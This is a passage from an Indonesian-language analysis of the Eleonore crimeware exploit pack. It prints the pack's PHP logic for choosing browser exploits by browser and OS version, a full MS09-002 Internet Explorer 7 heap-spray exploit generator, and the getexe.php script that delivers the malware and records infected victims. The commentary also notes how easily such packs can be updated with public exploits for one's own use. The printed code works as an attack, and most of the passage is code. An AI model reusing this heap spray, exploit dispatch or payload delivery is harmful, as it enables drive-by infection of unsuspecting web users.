+		if (($os == "Windows XP") or ($os == "Windows 2003"))
+		{
+		switch ($case_spl) {
+	
+		case 3:echo _crypt(Snapshot());		
+		       check();
+		       break;
+		case 2:echo "<html><body>"._crypt(DirectX_DS7())."</body></html>";	
+		       check();
+		       break;
+		case 1:echo _crypt(pdf_ie2());		
+		       check();
+		       break;
+		case 4:echo _crypt(mem_cor());		
+		       die;
+		       break;
+		}
+		}	
+		else 
+		{
+		switch ($case_spl) {
+	
+		case 2:echo _crypt(Snapshot());		
+		       check();
+		       break;
+		case 1:echo _crypt(pdf_ie2());		
+		       check();
+		       break;
+		case 3:echo _crypt(mem_cor());		
+		       die;
+		       break;
+		}
+		}
+	}
+//            for all IE version                  //
+$_GET["spl"] = $_GET["spl"]+1;
+echo '<META HTTP-EQUIV="REFRESH"
+CONTENT="1;URL=index.php?spl='.$_GET["spl"].'">';
+}
+
+//                 OPERA                      //
+elseif ($browser == "Opera")
+{
+	if ($vers[2] <= "9.25")
+	{
+	echo _crypt(op_telnet());
+	echo _crypt0(pdf_op());
+	}
+	else
+	{
+	echo _crypt(pdf_op());
+	}
+
+}
+
+//                   FireFox                               //
+elseif ($browser == "FireFox")
+{
+	if ($vers[2] <= "1.5")
+	{
+	echo _crypt(jno());
+	echo _crypt0(pdf_ff());
+	}
+	elseif ($vers[2] == "3.5")
+	{
+	echo font_tags();
+	echo _crypt(pdf_ff());
+	}
+	else 
+	{
+	echo _crypt(pdf_ff());
+	}
+
+}
+//                   Mozilla                              //
+elseif ($browser == "Mozilla")
+{
+
+	echo _crypt0(pdf_all());
+}
+else
+{
+		echo _crypt(pdf_all());
+
+}
+?>
+/////////////////////////////////////////////////////////////
+
+bagian diatas cukup jelas, dengan mengacu pada hasil deteksi browser
+serta sistem operasi, akan dilakukan proses eksploitasi menggunakan
+daftar eksploit yang tersedia satu per satu. Ambil contoh untuk internet
+explorer < 7, akan dilakukan test eksploit
+mdac,DirectX_DS7,Snapshot,msie_sx,pdf_ie2. Setiap satu eksploit ditest,
+akan dilakukan pengecekan, jika masih gagal akan dicoba eksploit
+berikutnya dengan metode "refesh". Fungsi-fungsi eksploit bisa dilihat
+pada file exp.php, salah satu contohnya:
+
+
+/////////////////////////////////////////////////////////////
+//=======================================================	
+// OK  ie7
+function mem_cor() 
+{
+$memcor_name = get_random_string_array(rand(8,15), '15');
+$content = '
+var '. $memcor_name[0] .' = unescape('._shellcode(mem_cor).');
+var '. $memcor_name[1] .' = new Array(); 
+var '. $memcor_name[2] .' = 0x100000-('. $memcor_name[0]
+.'.length*2+0x01020); 
+var '. $memcor_name[4] .' = unescape("%u0C0C%u0C0C"); 
+while('. $memcor_name[4] .'.length<'. $memcor_name[2] .'/2) { '.
+$memcor_name[4] .'+='. $memcor_name[4] .';} 
+var '. $memcor_name[3] .' = '. $memcor_name[4] .'.substring(0,'.
+$memcor_name[2] .'/2); 
+delete '. $memcor_name[4] .'; 
+for('. $memcor_name[5] .'=0; '. $memcor_name[5] .'<0xC0; '.
+$memcor_name[5] .'++) { 
+	'. $memcor_name[1] .'['. $memcor_name[5] .'] = '.
+$memcor_name[3] .' + '. $memcor_name[0] .';
+} 
+CollectGarbage();
+var '. $memcor_name[6]
+.'=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
+var '. $memcor_name[7] .' = new Array();
+for(var '. $memcor_name[11] .'=0;'. $memcor_name[11] .'<1000;'.
+$memcor_name[11] .'++) '. $memcor_name[7]
+.'.push(document.createElement("img"));
+function '. $memcor_name[10] .'() { 
+	'. $memcor_name[8] .'=document.createElement("tbody"); 
+	'. $memcor_name[8] .'.click; 
+	var '. $memcor_name[9] .' = '. $memcor_name[8] .'.cloneNode();	
+	'. $memcor_name[8] .'.clearAttributes(); 
+	'. $memcor_name[8] .'=null; CollectGarbage(); 
+	for(var '. $memcor_name[11] .'=0;'. $memcor_name[11] .'<'.
+$memcor_name[7] .'.length;'. $memcor_name[11] .'++) '. $memcor_name[7]
+.'['. $memcor_name[11] .'].src='. $memcor_name[6] .'; 
+	'. $memcor_name[9] .'.click;
+}
+window.setTimeout("'. $memcor_name[10] .'();",500);
+';
+
+return $content;
+}
+/////////////////////////////////////////////////////////////
+
+Exploit diatas untuk eksploit mem_cor, yaitu memory corruption pada
+internet explorer 7. Eksploit ini lebih dikenal sebagai MS09-002 dan
+pernah muncul dalam http://www.milw0rm.com/exploits/8080. Public
+disclosure exploit dan crimeware ibarat istilah 'lebih dulu ayam atau
+telur?'. Seringkali public disclosure yang diberikan oleh para whitehat
+merupakan hasil analisis dari log seperti IDS, ataupun hasil
+reverse-engineering suatu exploit yang sifatnya 0day, untuk kemudian di
+buat modul metasploitnya misalnya dan dipublish ke situs-situs seperti
+milw0rm.
+
+Atau bisa juga, justru crimeware lah yang melakukan update isi exploit
+pack nya berdasarkan exploit yang beredar di public disclosure. Jika
+kita memahami browser bug, metode seperti heap spray, dan bentuk
+eksploit suatu crimeware, maka dengan sangat mudah kita dapat
+meng-update daftar eksploit dari exploit pack yang kita gunakan untuk
+kebutuhan sendiri. Thanks buat staff k-elektronik mengenai tehnik
+porting exploit ini (heap spray is fun), ditunggu public article nya ;).
+
+Semua eksploit akan menggunakan shellcode yang sama, dan ini bisa dicek
+menggunakan shellcode2exe [4]. Kadang crimeware disisipi backdoor di
+shellcode nya, untuk itu kita perlu juga analisis apakah shellcode
+tersebut bersih atau tidak. Eleonore menyimpan shellcode tersebut pada
+file exp.php, yang intinya akan mentrigger korban untuk mengeksekusi
+file getexe.php apabila proses eksploitasi berhasil. 
+
+Berikut ini isi dari file getexe.php,
+
+/////////////////////////////////////////////////////////////
+<?php
+
+error_reporting(0);
+include'config.php';
+$size = filesize($file_load);
+$fp = fopen($file_load, "r");
+if ($source = fread($fp, $size))
+{
+header("Content-Disposition: inline; filename=".$file_load);
+header("\r\n");
+header("Content-Type: application/octet-stream\r\n\r\n");
+echo $source;
+$ip = $_SERVER['REMOTE_ADDR'];
+if (isset($_GET['spl'])) $spl = $_GET['spl'];
+elseif (isset($_POST['spl'])) $spl = $_POST['spl'];
+else $spl="--";
+mysql_connect($db_host, $db_user, $db_pass);
+mysql_select_db($db_name);
+$q = mysql_query("update statistic set good=1, spl='".$spl."'  where
+ip='".$ip."'");
+@mysql_free_result($q);
+}
+fclose($fp);
+
+?>
+/////////////////////////////////////////////////////////////
+
+Yang berarti, shellcode akan membuat korban mendownload malware yang
+telah dipersiapkan serta mengeksekusinya.
+
+
+--[9]-- Kesimpulan
+
+Banyak sekali crimeware yang bertebaran dalam komunitas underground, dan
+sangat mudah didapatkan versi leaknya atau versi freenya untuk kemudian
+di modifikasi sesuai kebutuhan. Eleonore tidak termasuk aplikasi yang
+hebat jika dilihat dari sudut pandang programmer seperti programmer PHP,
+dan seakan-akan menunjukan bahwa ini adalah mainan anak remaja dan bukan
+developer berpengalaman, namun dapat mengakibatkan kerusakan serta
+kerugian yang luar biasa. Dan yang pasti, dapat mendatangkan keuntungan
+finansial bagi developernya. 
+
+Welcome to the kiddies world ;).
+
+--[10]-- Referensi
+
+[1]. http://en.wikipedia.org/wiki/Malware
+[2]. http://en.wikipedia.org/wiki/Crimeware
+[3]. http://malwareint.blogspot.com/2010/01/spyeye-new-bot-on-market.html
+[4]. http://labs.idefense.com/software/malcode.php#more_malcode+analysis+pack
